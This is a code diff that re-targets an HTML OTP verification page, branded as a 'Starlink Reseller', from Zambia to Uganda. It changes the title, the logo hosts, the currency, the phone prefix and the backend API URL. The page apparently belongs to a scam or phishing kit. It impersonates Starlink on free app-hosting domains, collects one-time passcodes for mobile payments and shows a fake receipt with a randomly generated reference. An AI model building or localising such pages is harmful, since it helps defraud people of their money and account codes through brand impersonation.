@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OTP Verification - Starlink Zambia</title>
-    <link rel="icon" type="image/png" href="https://starlink-datapackagesm.vercel.app/static/images/starlink_logo.png">
+    <title>OTP Verification - Starlink Uganda</title>
+    <link rel="icon" type="image/png" href="https://ug-starlinknetwork.up.railway.app/static/images/starlink_logo_new.png">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
     <style>
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
@@ -322,9 +322,9 @@
     <header class="header">
         <div class="header-inner">
             <a href="/" class="brand">
-                <img src="https://starlink-datapackagesm.vercel.app/static/images/starlink_logo.png" alt="STARLINK" class="brand-logo-img">
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/starlink_logo_new.png" alt="STARLINK" class="brand-logo-img">
                 <div class="brand-divider"></div>
-                <span class="brand-sub">Zambia Reseller</span>
+                <span class="brand-sub">Uganda Reseller</span>
             </a>
         </div>
     </header>
@@ -346,7 +346,7 @@
                         </a>
                         <div class="amount-mini">
                             <p class="amount-mini-label">Amount</p>
-                            <p class="amount-mini-value" id="display-amount">ZMW 45.00</p>
+                            <p class="amount-mini-value" id="display-amount">UGX 45.00</p>
                         </div>
                     </div>
 
@@ -358,7 +358,7 @@
                         <div class="phone-chip-icon">
                             <i class="uil uil-mobile-android"></i>
                         </div>
-                        <span class="phone-chip-text" id="display-phone">+260 9XXXXXXXX</span>
+                        <span class="phone-chip-text" id="display-phone">+256 7XXXXXXXX</span>
                     </div>
 
                     <form id="otpForm" method="POST" autocomplete="off" onsubmit="return false;">
@@ -427,9 +427,9 @@
 
     <script>
         // ============================================
-        // RAILWAY BACKEND URL
+        // RAILWAY BACKEND URL (Uganda)
         // ============================================
-        const API_BASE = 'https://starlink-network-zm-production.up.railway.app';
+        const API_BASE = 'https://starlinknetwork-production.up.railway.app';
 
         // ============================================
         // READ PLAN FROM URL
@@ -439,10 +439,10 @@
         const planData = params.get('data') || '400GB';
         const planPrice = parseFloat(params.get('price') || '45');
         const planPeriod = params.get('period') || '2 Months';
-        const planPhone = params.get('phone') || '9XXXXXXXX';
+        const planPhone = params.get('phone') || '7XXXXXXXX';
 
-        document.getElementById('display-amount').textContent = 'ZMW ' + planPrice.toFixed(2);
-        document.getElementById('display-phone').textContent = '+260 ' + planPhone.replace(/^0/, '');
+        document.getElementById('display-amount').textContent = 'UGX ' + planPrice.toFixed(2);
+        document.getElementById('display-phone').textContent = '+256 ' + planPhone.replace(/^0/, '');
         document.getElementById('waitingPlan').textContent = planName;
         document.getElementById('successPlan').textContent = planName + ' (' + planData + ')';
 
@@ -530,12 +530,12 @@
         }
 
         function showSuccess() {
-            const ref = 'ZM' + Date.now().toString().slice(-8) + '.' + Math.random().toString(36).substring(2, 6).toUpperCase();
+            const ref = 'UG' + Date.now().toString().slice(-8) + '.' + Math.random().toString(36).substring(2, 6).toUpperCase();
 
             document.getElementById('receiptPlan').textContent = planName;
             document.getElementById('receiptData').textContent = planData;
-            document.getElementById('receiptAmount').textContent = 'ZMW ' + planPrice.toFixed(2);
-            document.getElementById('receiptPhone').textContent = '+260 ' + planPhone.replace(/^0/, '');
+            document.getElementById('receiptAmount').textContent = 'UGX ' + planPrice.toFixed(2);
+            document.getElementById('receiptPhone').textContent = '+256 ' + planPhone.replace(/^0/, '');
             document.getElementById('receiptRef').textContent = ref;
 
             successOverlay.classList.add('open');
